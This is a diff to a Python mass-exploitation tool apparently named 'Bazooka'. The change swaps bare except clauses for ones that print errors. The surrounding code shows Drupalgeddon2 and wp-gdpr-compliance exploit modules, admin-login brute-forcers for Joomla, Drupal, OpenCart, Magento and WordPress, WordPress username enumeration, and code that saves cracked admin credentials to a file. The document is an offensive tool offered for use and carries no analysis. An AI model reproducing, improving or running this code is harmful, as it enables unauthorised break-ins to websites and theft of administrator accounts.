                                  ' Success Mr Mahfoud Email Ready To rest Password\n'.format(site, self.EMail))
             else:
                 self.Print_NotVuln('wp-gdpr-compliance Exploit', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('wp-gdpr-compliance Exploit', site)
 
     class DrupalGedden2(object):
@@ -6625,7 +7020,8 @@ class Bazooka(object):
                     self.Version8Drupal(site)
                 else:
                     self.Version7Drupal(site)
-            except:
+            except Exception as inst:
+                print(inst)
                 self.Print_NotVuln('Drupalgeddon2', site)
 
         def Print_NotVuln(self, NameVuln, site):
@@ -6692,7 +7088,8 @@ class Bazooka(object):
                             self.Print_NotVuln('Drupalgeddon2', site)
                 else:
                     self.Print_NotVuln('Drupalgeddon2', site)
-            except:
+            except Exception as inst:
+                print(inst)
                 self.Print_NotVuln('Drupalgeddon2 Timeout!', site)
 
         def Version8Drupal(self, site):
@@ -6727,7 +7124,8 @@ class Bazooka(object):
                         self.Print_NotVuln('Drupalgeddon2', site)
                 else:
                     self.Print_NotVuln('Drupalgeddon2', site)
-            except:
+            except Exception as inst:
+                print(inst)
                 self.Print_NotVuln('Drupalgeddon2 Timeout!', site)
 
 
@@ -6773,7 +7171,8 @@ class Bazooka(object):
                     ToKeN = re.findall('type="hidden" name="(.*)" value="1"',
                                        GetToken.text)[0]
                     GeTOPtIoN = re.findall('type="hidden" name="option" value="(.*)"', GetToken.text)[0]
-                except:
+                except Exception as inst:
+                    print(inst)
                     ToKeN = ''
                     GeTOPtIoN = 'com_login'
                 post = {}
@@ -6792,7 +7191,8 @@ class Bazooka(object):
                         writer.write('http://' + site + '/administrator/index.php' + '\n Username: admin' +
                                      '\n Password: ' + passwd + '\n\n')
                     self.flag = 1
-            except:
+            except Exception as inst:
+                print(inst)
                 pass
 
     class DrupalBruteForce(object):
@@ -6834,7 +7234,8 @@ class Bazooka(object):
                 try:
                     GetOP = re.findall('id="edit-submit" name="op" value="(.*)"',
                                        GetToken.text)[0].split('"')[0]
-                except:
+                except Exception as inst:
+                    print(inst)
                     GetOP = 'Log in'
                 post = {}
                 post['name'] = "admin"
@@ -6850,7 +7251,8 @@ class Bazooka(object):
                         writer.write('http://' + site + '/user/login' + '\n Username: admin' + '\n Password: ' +
                                      passwd + '\n\n')
                     self.flag = 1
-            except:
+            except Exception as inst:
+                print(inst)
                 pass
 
     class OpenCart(object):
@@ -6899,7 +7301,8 @@ class Bazooka(object):
                         writer.write('http://' + site + '/admin/index.php' + '\n Username: admin' + '\n Password: ' +
                                      passwd + '\n\n')
                     self.flag = 1
-            except:
+            except Exception as inst:
+                print(inst)
                 pass
 
     class Magento(object):
@@ -6948,7 +7351,8 @@ class Bazooka(object):
                         writer.write('http://' + site + '/index.php/admin/' + '\n Username: admin' + '\n Password: ' +
                                      passwd + '\n\n')
                     self.flag = 1
-            except:
+            except Exception as inst:
+                print(inst)
                 pass
 
     class Wordpress(object):
@@ -6998,7 +7402,8 @@ class Bazooka(object):
                 if self.flag == 0:
                     print(self.c + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' '
                           + self.g + '[Wordpress BruteForce]' + self.r + ' [Failed]')
-            except:
+            except Exception as inst:
+                print(inst)
                 print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' '
                       + self.g + '[Wordpress BruteForce]' + self.r + ' [Failed]')
 
@@ -7020,7 +7425,8 @@ class Bazooka(object):
                         Usernamez = __InFo['slug']
                         return Usernamez
                     break
-            except:
+            except Exception as inst:
+                print(inst)
                 try:
                     if '/author/' not in __Check2.text:
                         return None
@@ -7062,7 +7468,8 @@ class Bazooka(object):
                                      '\n Password: ' +
                                      passwd + '\n\n')
                     self.flag = 1
-            except:
+            except Exception as inst:
+                print(inst)
                 pass
 
 
@@ -7108,7 +7515,8 @@ class Bazooka(object):
                         writer.write('http://' + site + '/admin/' + '\n Username: admin' + '\n Password: ' +
                                      passwd + '\n\n')
                     self.flag = 1
-            except:
+            except Exception as inst:
+                print(inst)
                 pass
 				
 
